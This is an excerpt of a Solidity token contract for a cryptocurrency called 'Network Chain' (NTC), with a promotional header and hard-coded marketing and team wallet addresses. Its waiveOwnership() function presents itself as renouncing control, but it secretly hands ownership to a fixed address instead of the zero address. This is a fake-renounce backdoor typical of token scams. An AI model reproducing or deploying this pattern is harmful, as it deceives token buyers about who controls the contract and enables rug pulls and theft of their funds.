...
/**
Network Chain is L1 Blockchain with Fast and more scalable than any blockchain, with IPOS (Network Chain Proof Of Stake) Consensus
Telegram : https://t.me/NetworkChainCN
Website : https://
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xFf95fFc6201112a1045d45329Cfb97279e7D4c61);
    }
...
contract networkchain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Network Chain";
    string private _symbol = "NTC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7D57dBB2f5407Bf0A2839d819B0Dc5029f8a39FA);
    address payable public teamWalletAddress = payable(0x7D57dBB2f5407Bf0A2839d819B0Dc5029f8a39FA);
